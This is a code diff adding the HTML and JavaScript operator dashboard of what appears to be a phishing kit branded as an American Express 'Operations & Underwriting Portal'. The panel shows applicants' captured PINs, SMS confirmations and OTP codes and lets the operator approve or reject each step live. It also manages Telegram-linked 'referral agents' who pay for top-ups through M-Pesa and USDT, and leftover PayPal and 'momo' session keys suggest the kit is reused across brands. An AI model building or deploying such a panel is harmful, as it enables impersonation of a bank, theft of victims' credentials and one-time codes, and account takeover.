@@ -1,0 +1,1263 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="referrer" content="no-referrer" />
+  <title>American Express — Operations & Underwriting Portal</title>
+  <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+  <link rel="shortcut icon" href="/favicon.ico" />
+  <style>
+    :root {
+      color-scheme: light;
+      --brand-blue: #006FCF;
+      --brand-blue-hover: #0056A3;
+      --brand-yellow: #006FCF;
+      --brand-yellow-hover: #0056A3;
+      --orange: #006FCF;
+      --orange-hover: #0056A3;
+      --navy: #002663;
+      --navy-dark: #00175A;
+      --purple: #002663;
+      --ink: #1F2937;
+      --muted: #4B5563;
+      --line: #E5E7EB;
+      --card-bg: #FFFFFF;
+      --bg: #F4F6F8;
+      --green: #10B981;
+      --blue: #006FCF;
+      --red: #EF4444;
+      --yellow: #F59E0B;
+    }
+    * { box-sizing: border-box; }
+    body { margin: 0; min-height: 100vh; background: var(--bg); color: var(--ink); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; line-height: 1.5; }
+    header { padding: 14px max(24px, calc((100vw - 1100px) / 2)); background: var(--navy); color: white; border-bottom: 3px solid var(--brand-blue); display: flex; align-items: center; justify-content: space-between; box-shadow: 0 2px 10px rgba(0, 38, 99, 0.2); }
+    header strong { font-size: 18px; letter-spacing: -0.01em; display: flex; align-items: center; gap: 10px; font-weight: 700; }
+    .badge { display: inline-flex; align-items: center; padding: 2px 8px; border-radius: 999px; font-size: 11px; font-weight: 700; text-transform: uppercase; }
+    .badge.green { background: #e6f7ec; color: var(--green); border: 1px solid #b7e8c4; }
+    .badge.gray { background: #eef0f2; color: var(--muted); border: 1px solid #d1d5db; }
+    .badge.yellow { background: #fff8e1; color: var(--yellow); border: 1px solid #ffe082; }
+    .badge.blue { background: #e8f1fc; color: var(--blue); border: 1px solid #bbd6fa; }
+    .badge.red { background: #fde8e8; color: var(--red); border: 1px solid #f8b4b4; }
+
+    main { width: min(100% - 32px, 1080px); margin: 32px auto 60px; display: grid; gap: 24px; }
+    .section-card { background: var(--card-bg); border: 1px solid var(--line); border-radius: 10px; padding: 24px 28px; box-shadow: 0 2px 8px rgba(0,0,0,0.04); }
+    .section-card h2 { margin: 0 0 6px; color: var(--navy); font-size: 20px; display: flex; align-items: center; justify-content: space-between; }
+    .section-card p.desc { margin: 0 0 18px; color: var(--muted); font-size: 14px; }
+
+    .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+    .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 16px; }
+    @media (max-width: 768px) { .grid-2, .grid-3 { grid-template-columns: 1fr; } }
+
+    label { display: block; font-size: 13px; font-weight: 600; color: #40444d; margin: 12px 0 6px; }
+    input, select { width: 100%; min-height: 44px; padding: 9px 12px; border: 1px solid var(--line); border-radius: 6px; font-size: 14px; background: #fff; transition: border-color 0.15s; }
+    input:focus, select:focus { outline: none; border-color: var(--orange); box-shadow: 0 0 0 3px rgba(245,130,40,0.15); }
+    
+    button { min-height: 44px; border: 0; border-radius: 6px; padding: 0 20px; background: var(--orange); color: white; font-weight: 700; font-size: 14px; cursor: pointer; transition: background 0.15s, transform 0.05s; display: inline-flex; align-items: center; justify-content: center; gap: 8px; }
+    button:hover { background: var(--orange-hover); }
+    button:active { transform: translateY(1px); }
+    button:disabled { opacity: 0.55; cursor: wait; }
+    button.secondary { background: #e9eaec; color: #374151; font-weight: 600; }
+    button.secondary:hover { background: #dcdfe3; }
+    button.small { min-height: 32px; padding: 0 12px; font-size: 12px; }
+
+    .language-toggle { min-width: 44px; min-height: 36px; border: 1px solid rgba(255,255,255,.45); border-radius: 6px; background: transparent; color: white; cursor: pointer; }
+    .language-toggle:hover { background: rgba(255,255,255,.15); }
+
+    .token-bar { background: #fff; border: 1px solid var(--line); border-radius: 8px; padding: 14px 20px; display: flex; align-items: center; justify-content: space-between; gap: 16px; flex-wrap: wrap; }
+    .token-bar-input { display: flex; align-items: center; gap: 10px; flex: 1; min-width: 280px; }
+    .token-bar-input input { min-height: 38px; }
+
+    .status-pill { display: inline-flex; align-items: center; gap: 6px; font-size: 12px; font-weight: 600; }
+    .status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; }
+    .status-dot.active { background: #10b981; box-shadow: 0 0 0 3px rgba(16, 185, 129, 0.2); }
+    .status-dot.inactive { background: #9ca3af; }
+
+    .tip-box { background: #eff6ff; border: 1px solid #bfdbfe; border-radius: 6px; padding: 12px 14px; font-size: 13px; color: #1e40af; margin-top: 14px; line-height: 1.45; }
+    .tip-box code { background: #dbeafe; padding: 2px 6px; border-radius: 4px; font-family: monospace; font-size: 13px; font-weight: 600; }
+
+    .success-panel { background: #f0fdf4; border: 1px solid #bbf7d0; border-radius: 8px; padding: 18px 22px; margin-top: 18px; }
+    .success-panel h3 { margin: 0 0 6px; color: #166534; font-size: 16px; }
+    .copy-group { display: flex; gap: 8px; margin: 8px 0 12px; }
+    .copy-group input { font-family: monospace; font-size: 13px; background: #fff; }
+
+    .table-container { overflow-x: auto; margin-top: 16px; border: 1px solid var(--line); border-radius: 6px; }
+    table { width: 100%; border-collapse: collapse; text-align: left; font-size: 13px; background: #fff; }
+    th { background: #f8fafc; color: #475569; font-weight: 700; text-transform: uppercase; font-size: 11px; padding: 10px 14px; border-bottom: 1px solid var(--line); }
+    td { padding: 12px 14px; border-bottom: 1px solid #edf0f2; vertical-align: middle; }
+    tr:last-child td { border-bottom: none; }
+    tr:hover td { background: #fcfdfe; }
+
+    .stage-select { min-height: 32px; padding: 4px 8px; font-size: 12px; border-radius: 4px; font-weight: 600; }
+    .btn-step-action { display: inline-flex; align-items: center; padding: 3px 8px; border-radius: 4px; font-size: 11px; font-weight: 700; cursor: pointer; border: 1px solid transparent; margin-top: 4px; margin-right: 4px; transition: all 0.15s ease; }
+    .btn-step-action.approve { background: #ecfdf5; color: #065f46; border-color: #a7f3d0; }
+    .btn-step-action.approve:hover { background: #d1fae5; }
+    .btn-step-action.reject { background: #fef2f2; color: #991b1b; border-color: #fecaca; }
+    .btn-step-action.reject:hover { background: #fee2e2; }
+    .error-msg { color: var(--red); font-size: 13px; margin-top: 8px; font-weight: 600; min-height: 18px; }
+    .success-msg { color: var(--green); font-size: 13px; margin-top: 8px; font-weight: 600; }
+    [hidden] { display: none !important; }
+  </style>
+</head>
+<body>
+  <header>
+    <strong style="display:flex;align-items:center;gap:12px;"><img src="/amex_logo_white.svg" style="height:28px;" alt="American Express" /> American Express / Operations & Underwriting Portal</strong>
+    <div style="display:flex; align-items:center; gap:10px;">
+      <button id="adminHeaderLogoutBtn" type="button" class="secondary small" style="display:none; color:#ef4444; border:1px solid #fecaca; background:#fff1f2; font-weight:700;">🔒 Log Out</button>
+      <button class="language-toggle" type="button">EN</button>
+    </div>
+  </header>
+
+  <main>
+    <!-- 2FA LOGIN PORTAL (Displayed when unauthenticated) -->
+    <div id="admin2faPortal" style="max-width: 480px; margin: 40px auto; padding: 0 16px;">
+      <div class="section-card" style="box-shadow: 0 10px 25px -5px rgba(0,0,0,0.08), 0 8px 10px -6px rgba(0,0,0,0.04); border-top: 4px solid var(--orange);">
+        <div style="text-align: center; margin-bottom: 22px;">
+          <div style="width: 56px; height: 56px; background: #fff7ed; border: 2px solid #fed7aa; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; font-size: 26px; margin-bottom: 12px;">
+            🔐
+          </div>
+          <h2 style="margin: 0; font-size: 20px; font-weight: 800; color: #1e293b;">Protected Admin Access</h2>
+          <p style="margin: 6px 0 0; font-size: 13px; color: var(--muted); line-height: 1.5;">
+            Two-step verification with a one-time security code sent to your Telegram.
+          </p>
+        </div>
+
+        <!-- Step 1: Admin Secret Token -->
+        <div id="portalStep1">
+          <label for="portalAdminToken">Administrator Password / Token:</label>
+          <input id="portalAdminToken" type="password" placeholder="Enter your administrator password..." autocomplete="current-password" autofocus />
+          <p style="font-size: 11.5px; color: var(--muted); margin: 6px 0 16px;">
+            🛡️ Monitored access. Unauthorized attempts immediately alert the administrator via Telegram.
+          </p>
+          <button id="requestOtpBtn" type="button" style="width: 100%;">
+            <span>📲 Request 2FA Code via Telegram</span>
+          </button>
+          <div id="portalStep1Error" class="error-msg" style="text-align: center; margin-top: 10px;"></div>
+        </div>
+
+        <!-- Step 2: 6-Digit Telegram OTP -->
+        <div id="portalStep2" style="display: none;">
+          <div style="background: #eff6ff; border: 1px solid #bfdbfe; border-radius: 8px; padding: 12px 14px; font-size: 13px; color: #1e40af; margin-bottom: 16px; line-height: 1.45;">
+            💬 A 6-digit OTP code was sent to your Telegram 
+            <span id="targetChatNotice" style="font-weight: 700;"></span>. Please check your notification!
+          </div>
+
+          <label for="portalOtpCode" style="text-align:center;">Confirmation Code (6 Digits):</label>
+          <input id="portalOtpCode" type="text" inputmode="numeric" maxlength="6" placeholder="• • • • • •" style="text-align:center; font-size:24px; font-weight:800; letter-spacing:8px; font-family:monospace; min-height:52px;" autocomplete="one-time-code" />
+
+          <div style="display: flex; gap: 8px; margin-top: 14px;">
+            <button id="verifyOtpBtn" type="button" style="flex: 1;">
+              <span>🔓 Verify & Access Dashboard</span>
+            </button>
+            <button id="cancelOtpBtn" type="button" class="secondary" style="width: 80px;">
+              <span>Back</span>
+            </button>
+          </div>
+          <div id="portalStep2Error" class="error-msg" style="text-align: center; margin-top: 10px;"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- MAIN ADMIN DASHBOARD CONTENT (Hidden until 2FA verified) -->
+    <div id="adminDashboardContent" style="display: none;">
+      <!-- Top Authentication & Status Bar -->
+      <div class="token-bar" style="background:#f8fafc; border:1px solid #e2e8f0; margin-bottom: 20px;">
+        <div style="display:flex; align-items:center; gap:10px;">
+          <span style="display:inline-flex; align-items:center; gap:6px; background:#ecfdf5; color:#065f46; border:1px solid #a7f3d0; padding:4px 10px; border-radius:20px; font-size:12px; font-weight:700;">
+            <span>🛡️</span>
+            <span>2FA Session Verified & Active</span>
+          </span>
+        </div>
+        <div style="display:flex; align-items:center; gap:10px;">
+          <button id="logoutDashboardBtn" type="button" class="secondary small" style="color:#b91c1c; border-color:#fecaca; background:#fff1f2; font-weight:700;">
+            🚪 Log Out
+          </button>
+        </div>
+      </div>
+
+    <!-- 1. Telegram Bot Settings Card -->
+    <section class="section-card">
+      <h2>
+        <span>Telegram Bot Settings</span>
+        <span id="botStatusBadge" class="status-pill"><span id="botStatusDot" class="status-dot inactive"></span><span id="botStatusText">Loading...</span></span>
+      </h2>
+      <p class="desc">Add your Telegram bot token and your admin user ID here to enable real-time notifications and commands.</p>
+      
+      <form id="telegramSettingsForm">
+        <div class="grid-3">
+          <div>
+            <label for="botToken">Telegram Bot Token</label>
+            <input id="botToken" type="password" placeholder="e.g.: 789123456:AAFlk..." autocomplete="off" />
+          </div>
+          <div>
+            <label for="adminChatId">Administrator Chat ID</label>
+            <input id="adminChatId" type="text" placeholder="e.g.: 123456789" />
+          </div>
+          <div>
+            <label for="botUsername">Bot Username (@)</label>
+            <input id="botUsername" type="text" placeholder="e.g.: shacklebaybot" />
+          </div>
+        </div>
+
+        <div style="margin-top: 10px;">
+          <label for="publicAppUrl">Public Application URL (Base link for agents & bot)</label>
+          <input id="publicAppUrl" type="url" placeholder="e.g.: https://z-pgx8.onrender.com" />
+        </div>
+        
+        <div style="margin-top: 16px; display:flex; align-items:center; gap:12px;">
+          <button id="saveSettingsBtn" type="submit">Save Telegram Settings</button>
+          <button id="toggleTokenVisibility" type="button" class="secondary small">Show / Hide Token</button>
+          <span id="settingsMsg" class="success-msg"></span>
+        </div>
+      </form>
+
+      <div class="tip-box">
+        💡 <strong>How to get your Chat ID?</strong> Ask the agent or open your bot in Telegram and send the <code>/start</code> command. The bot will reply with your exact ID!
+      </div>
+
+      <div class="tip-box" style="margin-top: 10px; background: rgba(34, 197, 94, 0.08); border-left: 3px solid #22c55e;">
+        🟢 <strong>24/7 Execution Active:</strong> The bot operates around the clock with server auto-start, watchdog supervisor, and cloud keep-alive. No need to reopen or save each session!
+      </div>
+
+      <!-- Change Admin Password Section -->
+      <div style="margin-top: 20px; padding-top: 18px; border-top: 1px dashed var(--line);">
+        <h3 style="margin: 0 0 4px; font-size: 14px; font-weight: 700; color: #1e293b; display: flex; align-items: center; gap: 6px;">
+          <span>🔑</span>
+          <span>Change Administrator Password</span>
+        </h3>
+        <p style="font-size: 12px; color: var(--muted); margin: 0 0 10px;">
+          Replace the current password with a strong, custom password to prevent unauthorized access to the dashboard.
+        </p>
+        <div style="display:flex; gap:10px; max-width: 480px; flex-wrap:wrap;">
+          <input id="newAdminTokenInput" type="password" placeholder="New administrator password..." autocomplete="new-password" style="flex:1; min-width:200px;" />
+          <button id="saveNewAdminTokenBtn" type="button" class="secondary small" style="white-space:nowrap; font-weight:700;">
+            Update Password
+          </button>
+        </div>
+        <span id="adminTokenMsg" class="success-msg"></span>
+      </div>
+    </section>
+
+    <!-- 2. Payment Methods & Top-Up Settings Card -->
+    <!-- 2. Payment Methods & Top-Up Settings Card -->
+    <section class="section-card">
+      <h2>
+        <span>Payment Methods & Top-Up Settings</span>
+      </h2>
+      <p class="desc">Configure official payment details (M-Pesa Till, Paybill, Airtel Money, and Crypto) so agents can top up their accounts using the <code>/topup</code> command in Telegram.</p>
+
+      <form id="paymentSettingsForm">
+        <div class="grid-3">
+          <div>
+            <label for="pmMpesaTill">M-Pesa Till (Buy Goods)</label>
+            <input id="pmMpesaTill" placeholder="e.g.: 5544332" />
+          </div>
+          <div>
+            <label for="pmMpesaPaybill">M-Pesa Paybill (Business No)</label>
+            <input id="pmMpesaPaybill" placeholder="e.g.: 889900" />
+          </div>
+          <div>
+            <label for="pmMpesaAccount">M-Pesa Account / Reference</label>
+            <input id="pmMpesaAccount" placeholder="e.g.: MOMO or Agent ID" />
+          </div>
+        </div>
+
+        <div class="grid-3" style="margin-top: 10px;">
+          <div>
+            <label for="pmAirtelMoney">Airtel Money</label>
+            <input id="pmAirtelMoney" placeholder="e.g.: +1 (555) 123-4567" />
+          </div>
+          <div>
+            <label for="pmCryptoAddress">Cryptocurrency Address (USDT / Crypto)</label>
+            <input id="pmCryptoAddress" placeholder="e.g.: TQn9Y2khEsLJW1ChVWFMSMe..." />
+          </div>
+          <div>
+            <label for="pmCryptoNetwork">Cryptocurrency Network</label>
+            <input id="pmCryptoNetwork" placeholder="e.g.: USDT (TRC20)" value="USDT (TRC20)" />
+          </div>
+        </div>
+
+        <div style="margin-top: 10px;">
+          <label for="pmInstructions">Top-Up Instructions for Agents</label>
+          <input id="pmInstructions" placeholder="e.g.: After payment, send confirmation receipt with your Agent ID for validation." />
+        </div>
+
+        <div style="margin-top: 16px; display:flex; align-items:center; gap:12px;">
+          <button id="savePaymentBtn" type="submit">Save Payment Methods</button>
+          <span id="paymentMsg" class="success-msg"></span>
+        </div>
+      </form>
+    </section>
+
+    <!-- 3. Register Agent Card with Telegram Chat ID -->
+    <section class="section-card">
+      <h2>Register Referral Agent</h2>
+      <p class="desc">Register an agent by name and their <strong>Telegram Chat ID</strong>. A unique referral link will be generated instantly!</p>
+
+      <form id="createAgentForm">
+        <div class="grid-3">
+          <div>
+            <label for="displayName">Agent Full Name *</label>
+            <input id="displayName" maxlength="100" placeholder="e.g.: Armando Silva" required />
+          </div>
+          <div>
+            <label for="agentTelegramChatId">Telegram Chat ID (Provided by agent)</label>
+            <input id="agentTelegramChatId" placeholder="e.g.: 987654321" />
+          </div>
+          <div>
+            <label for="agentEmail">Agent Email (Optional)</label>
+            <input id="agentEmail" type="email" maxlength="254" placeholder="agent@example.com" />
+          </div>
+        </div>
+
+        <div style="margin-top: 18px;">
+          <button id="createAgentBtn" type="submit">Create Agent & Generate Link</button>
+          <div class="error-msg" id="agentError"></div>
+        </div>
+      </form>
+
+      <!-- Result Box with instant referral link -->
+      <div class="success-panel" id="agentResultPanel" hidden>
+        <h3>🎉 Agent Created Successfully!</h3>
+        <p style="margin: 4px 0 10px; font-size: 13px; color: #374151;">
+          All applications submitted through this referral link will be sent <strong>directly to the agent's Telegram</strong>.
+        </p>
+
+        <label style="margin-top: 4px;">Agent Referral Link (Share with the agent):</label>
+        <div class="copy-group">
+          <input id="resultReferralUrl" readonly />
+          <button type="button" id="copyReferralBtn">Copy Link</button>
+        </div>
+
+        <div class="grid-3" style="margin-top: 10px;">
+          <div>
+            <label>Username:</label>
+            <input id="resultUsername" readonly style="font-family: monospace; font-size:13px;" />
+          </div>
+          <div>
+            <label>Temporary Password (Web Dashboard):</label>
+            <input id="resultTempPassword" readonly style="font-family: monospace; font-size:13px;" />
+          </div>
+          <div>
+            <label>Telegram Chat ID:</label>
+            <input id="resultChatId" readonly style="font-family: monospace; font-size:13px;" />
+          </div>
+        </div>
+        <p id="copyNotice" class="success-msg" style="margin-top:8px;"></p>
+      </div>
+    </section>
+
+    <!-- 4. Applications & Workflow Stages -->
+    <section class="section-card">
+      <h2>
+        <span>Loan Applications & Verification Stages</span>
+      </h2>
+      <p class="desc">Monitor applications in real time, inspect verification steps (PIN, SMS confirmation, and OTP), and approve or reject each step directly.</p>
+
+      <div style="margin-top: 14px; display:flex; gap:10px; align-items:center; flex-wrap:wrap;">
+        <input id="appSearchInput" type="text" placeholder="🔍 Search by applicant, phone, reference..." style="flex:1; min-width:240px; max-width:360px; min-height:34px; padding:6px 12px; font-size:13px; border:1px solid var(--line); border-radius:6px;" />
+        <button type="button" class="secondary small" id="refreshAppsBtn">Refresh Applications</button>
+      </div>
+
+      <div class="table-container">
+        <table>
+          <thead>
+            <tr>
+              <th>Ref / Date</th>
+              <th>Applicant</th>
+              <th>Phone</th>
+              <th>Loan</th>
+              <th>Step 3: PIN</th>
+              <th>Step 4: SMS Confirmation</th>
+              <th>Step 5: OTP Code</th>
+              <th>Agent</th>
+              <th>Final Decision</th>
+            </tr>
+          </thead>
+          <tbody id="applicationRows">
+            <tr><td colspan="9" style="text-align:center; color:var(--muted); padding:24px;">Please authenticate to load applications.</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <!-- 5. Active Agents List -->
+    <section class="section-card">
+      <h2>
+        <span>Registered Agents</span>
+        <button type="button" class="secondary small" id="refreshAgentsBtn">Refresh Agents</button>
+      </h2>
+      <p class="desc">List of all active agents, their Telegram chat IDs, and referral links.</p>
+
+      <div class="table-container">
+        <table>
+          <thead>
+            <tr>
+              <th>Name</th>
+              <th>Username</th>
+              <th>Telegram Chat ID</th>
+              <th>Total Leads</th>
+              <th>Referral Link</th>
+              <th>Actions</th>
+            </tr>
+          </thead>
+          <tbody id="agentRows">
+            <tr><td colspan="6" style="text-align:center; color:var(--muted); padding:24px;">Please authenticate to load agents.</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <!-- 6. Send Message to Agents Card -->
+    <section class="section-card" id="agentMessageSection">
+      <h2>
+        <span>Send Message to Agents (Telegram)</span>
+      </h2>
+      <p class="desc">Send announcements, updates, or direct messages to a specific agent's Telegram or broadcast to all agents.</p>
+
+      <form id="sendMessageForm">
+        <div class="grid-2">
+          <div>
+            <label for="messageTarget">Recipient *</label>
+            <select id="messageTarget" required>
+              <option value="all">📢 All Agents with Telegram (Broadcast)</option>
+              <option value="custom">✏️ Custom Chat ID...</option>
+            </select>
+          </div>
+          <div id="customChatGroup" hidden>
+            <label for="customChatId">Recipient Chat ID *</label>
+            <input id="customChatId" placeholder="e.g.: 123456789" />
+          </div>
+        </div>
+
+        <div style="margin-top: 12px;">
+          <label for="agentMessageText">Message *</label>
+          <textarea id="agentMessageText" rows="4" style="width:100%; min-height:90px; padding:10px 12px; border:1px solid var(--line); border-radius:6px; font-size:14px; font-family:inherit; resize:vertical; background:#fff;" placeholder="Type the message or announcement you wish to send to the agent(s)..." required></textarea>
+        </div>
+
+        <div style="margin-top: 16px; display:flex; align-items:center; gap:12px; flex-wrap:wrap;">
+          <button id="sendMessageBtn" type="submit">Send Message via Telegram</button>
+          <span id="messageStatusMsg" class="success-msg"></span>
+          <span id="messageErrorMsg" class="error-msg" style="margin:0;"></span>
+        </div>
+      </form>
+    </section>
+  </div>
+  </main>
+
+  <script src="/language.js"></script>
+  <script>
+    window.t = window.t || function(key) { return key; };
+
+    const SESSION_TOKEN_KEY = 'amex_admin_session_token';
+    let currentChallengeId = null;
+
+    function getSessionToken() {
+      return sessionStorage.getItem(SESSION_TOKEN_KEY) || sessionStorage.getItem('paypal_admin_session_token') || sessionStorage.getItem('momo_admin_session_token') || '';
+    }
+
+    function setSessionToken(token) {
+      if (token) {
+        sessionStorage.setItem(SESSION_TOKEN_KEY, token);
+        sessionStorage.setItem('paypal_admin_session_token', token);
+      } else {
+        sessionStorage.removeItem(SESSION_TOKEN_KEY);
+        sessionStorage.removeItem('paypal_admin_session_token');
+      }
+    }
+
+    function getAdminToken() {
+      return getSessionToken();
+    }
+
+    function authHeaders() {
+      return {
+        'Content-Type': 'application/json',
+        'Authorization': `Bearer ${getSessionToken()}`
+      };
+    }
+
+    const admin2faPortal = document.getElementById('admin2faPortal');
+    const adminDashboardContent = document.getElementById('adminDashboardContent');
+    const adminHeaderLogoutBtn = document.getElementById('adminHeaderLogoutBtn');
+    const logoutDashboardBtn = document.getElementById('logoutDashboardBtn');
+    const portalStep1 = document.getElementById('portalStep1');
+    const portalStep2 = document.getElementById('portalStep2');
+    const portalAdminToken = document.getElementById('portalAdminToken');
+    const portalStep1Error = document.getElementById('portalStep1Error');
+    const requestOtpBtn = document.getElementById('requestOtpBtn');
+    const portalOtpCode = document.getElementById('portalOtpCode');
+    const portalStep2Error = document.getElementById('portalStep2Error');
+    const verifyOtpBtn = document.getElementById('verifyOtpBtn');
+    const cancelOtpBtn = document.getElementById('cancelOtpBtn');
+    const targetChatNotice = document.getElementById('targetChatNotice');
+    const saveNewAdminTokenBtn = document.getElementById('saveNewAdminTokenBtn');
+    const newAdminTokenInput = document.getElementById('newAdminTokenInput');
+    const adminTokenMsg = document.getElementById('adminTokenMsg');
+    const botStatusBadge = document.getElementById('botStatusBadge');
+    const botStatusDot = document.getElementById('botStatusDot');
+    const botStatusText = document.getElementById('botStatusText');
+
+    function showLoginPortal() {
+      if (adminDashboardContent) adminDashboardContent.style.display = 'none';
+      if (admin2faPortal) admin2faPortal.style.display = 'block';
+      if (adminHeaderLogoutBtn) adminHeaderLogoutBtn.style.display = 'none';
+      if (portalStep1) portalStep1.style.display = 'block';
+      if (portalStep2) portalStep2.style.display = 'none';
+      if (portalStep1Error) portalStep1Error.textContent = '';
+      if (portalStep2Error) portalStep2Error.textContent = '';
+      if (portalAdminToken) {
+        portalAdminToken.value = '';
+        portalAdminToken.focus();
+      }
+      if (portalOtpCode) portalOtpCode.value = '';
+      currentChallengeId = null;
+    }
+
+    function showDashboard() {
+      if (admin2faPortal) admin2faPortal.style.display = 'none';
+      if (adminDashboardContent) adminDashboardContent.style.display = 'block';
+      if (adminHeaderLogoutBtn) adminHeaderLogoutBtn.style.display = 'inline-flex';
+      loadSettings();
+      loadApplications();
+      loadAgents();
+    }
+
+    async function checkAuthAndInit() {
+      const token = getSessionToken();
+      if (!token) {
+        showLoginPortal();
+        return;
+      }
+      try {
+        const res = await fetch('/api/admin/auth/check', {
+          headers: authHeaders()
+        });
+        if (res.ok) {
+          showDashboard();
+        } else {
+          setSessionToken(null);
+          showLoginPortal();
+        }
+      } catch (_) {
+        showLoginPortal();
+      }
+    }
+
+    async function handleRequestOtp() {
+      const token = portalAdminToken.value.trim();
+      if (!token) {
+        portalStep1Error.textContent = window.t('Please enter your administrator password or token.');
+        portalAdminToken.focus();
+        return;
+      }
+      portalStep1Error.textContent = '';
+      requestOtpBtn.disabled = true;
+      requestOtpBtn.innerHTML = '<span>⏳ Validating & sending code...</span>';
+      try {
+        const res = await fetch('/api/admin/auth/challenge', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ adminToken: token })
+        });
+        const data = await res.json();
+        if (!res.ok) {
+          throw new Error(data.error || 'Invalid admin token.');
+        }
+        if (data.otpRequired) {
+          currentChallengeId = data.challengeId;
+          portalStep1.style.display = 'none';
+          portalStep2.style.display = 'block';
+          if (targetChatNotice) targetChatNotice.textContent = data.maskedChat ? `(${data.maskedChat})` : '';
+          portalOtpCode.value = '';
+          portalStep2Error.textContent = '';
+          portalOtpCode.focus();
+        } else if (data.sessionToken) {
+          setSessionToken(data.sessionToken);
+          showDashboard();
+        }
+      } catch (err) {
+        portalStep1Error.textContent = err.message;
+      } finally {
+        requestOtpBtn.disabled = false;
+        requestOtpBtn.innerHTML = '<span>📲 Request 2FA Code via Telegram</span>';
+      }
+    }
+
+    async function handleVerifyOtp() {
+      const code = portalOtpCode.value.trim();
+      if (!code || !/^\d{6}$/.test(code)) {
+        portalStep2Error.textContent = window.t('Enter the 6-digit verification code received on Telegram.');
+        portalOtpCode.focus();
+        return;
+      }
+      if (!currentChallengeId) {
+        showLoginPortal();
+        return;
+      }
+      portalStep2Error.textContent = '';
+      verifyOtpBtn.disabled = true;
+      verifyOtpBtn.innerHTML = '<span>⏳ Verifying code...</span>';
+      try {
+        const res = await fetch('/api/admin/auth/verify-2fa', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ challengeId: currentChallengeId, code: code })
+        });
+        const data = await res.json();
+        if (!res.ok) {
+          throw new Error(data.error || 'Incorrect code.');
+        }
+        setSessionToken(data.sessionToken);
+        showDashboard();
+      } catch (err) {
+        portalStep2Error.textContent = err.message;
+        portalOtpCode.focus();
+      } finally {
+        verifyOtpBtn.disabled = false;
+        verifyOtpBtn.innerHTML = '<span>🔓 Verify & Access Dashboard</span>';
+      }
+    }
+
+    if (requestOtpBtn) requestOtpBtn.addEventListener('click', handleRequestOtp);
+    if (verifyOtpBtn) verifyOtpBtn.addEventListener('click', handleVerifyOtp);
+
+    if (portalAdminToken) {
+      portalAdminToken.addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') {
+          e.preventDefault();
+          handleRequestOtp();
+        }
+      });
+    }
+
+    if (portalOtpCode) {
+      portalOtpCode.addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') {
+          e.preventDefault();
+          handleVerifyOtp();
+        }
+      });
+      portalOtpCode.addEventListener('input', () => {
+        if (portalOtpCode.value.trim().length === 6) {
+          handleVerifyOtp();
+        }
+      });
+    }
+
+    if (cancelOtpBtn) {
+      cancelOtpBtn.addEventListener('click', () => {
+        portalStep2.style.display = 'none';
+        portalStep1.style.display = 'block';
+        portalStep1Error.textContent = '';
+        currentChallengeId = null;
+        portalAdminToken.focus();
+      });
+    }
+
+    async function logoutAdmin() {
+      try {
+        await fetch('/api/admin/auth/logout', {
+          method: 'POST',
+          headers: authHeaders()
+        });
+      } catch (_) {}
+      setSessionToken(null);
+      showLoginPortal();
+    }
+
+    if (adminHeaderLogoutBtn) adminHeaderLogoutBtn.addEventListener('click', logoutAdmin);
+    if (logoutDashboardBtn) logoutDashboardBtn.addEventListener('click', logoutAdmin);
+
+    if (saveNewAdminTokenBtn && newAdminTokenInput) {
+      saveNewAdminTokenBtn.addEventListener('click', async () => {
+        const newToken = newAdminTokenInput.value.trim();
+        if (!newToken || newToken.length < 6) {
+          alert('The new password must be at least 6 characters long.');
+          newAdminTokenInput.focus();
+          return;
+        }
+        saveNewAdminTokenBtn.disabled = true;
+        adminTokenMsg.textContent = '';
+        try {
+          const res = await fetch('/api/admin/settings', {
+            method: 'POST',
+            headers: authHeaders(),
+            body: JSON.stringify({ newAdminToken: newToken })
+          });
+          const data = await res.json();
+          if (!res.ok) throw new Error(data.error || 'Failed to update password.');
+          adminTokenMsg.textContent = '✓ Administrator password updated successfully!';
+          newAdminTokenInput.value = '';
+          setTimeout(() => { if (adminTokenMsg) adminTokenMsg.textContent = ''; }, 5000);
+        } catch (err) {
+          alert(err.message);
+        } finally {
+          saveNewAdminTokenBtn.disabled = false;
+        }
+      });
+    }
+
+    // 1. Load Telegram Settings
+    async function loadSettings() {
+      const token = getAdminToken();
+      if (!token) return;
+      try {
+        const response = await fetch(`/api/admin/settings?origin=${encodeURIComponent(window.location.origin)}`, { headers: authHeaders() });
+        if (response.status === 401) {
+          setSessionToken(null);
+          showLoginPortal();
+          return;
+        }
+        if (!response.ok) return;
+        const data = await response.json();
+        
+        if (data.maskedBotToken) {
+          document.getElementById('botToken').placeholder = data.maskedBotToken;
+        }
+        if (data.adminChatId) {
+          document.getElementById('adminChatId').value = data.adminChatId;
+        }
+        if (data.botUsername) {
+          document.getElementById('botUsername').value = data.botUsername;
+        }
+        if (document.getElementById('publicAppUrl')) {
+          document.getElementById('publicAppUrl').value = data.publicAppUrl || window.location.origin;
+        }
+
+        if (data.paymentMethods) {
+          const pm = data.paymentMethods;
+          if (document.getElementById('pmMpesaTill')) document.getElementById('pmMpesaTill').value = pm.mpesaTill || '';
+          if (document.getElementById('pmMpesaPaybill')) document.getElementById('pmMpesaPaybill').value = pm.mpesaPaybill || '';
+          if (document.getElementById('pmMpesaAccount')) document.getElementById('pmMpesaAccount').value = pm.mpesaAccount || '';
+          if (document.getElementById('pmAirtelMoney')) document.getElementById('pmAirtelMoney').value = pm.airtelMoney || '';
+          if (document.getElementById('pmCryptoAddress')) document.getElementById('pmCryptoAddress').value = pm.cryptoAddress || '';
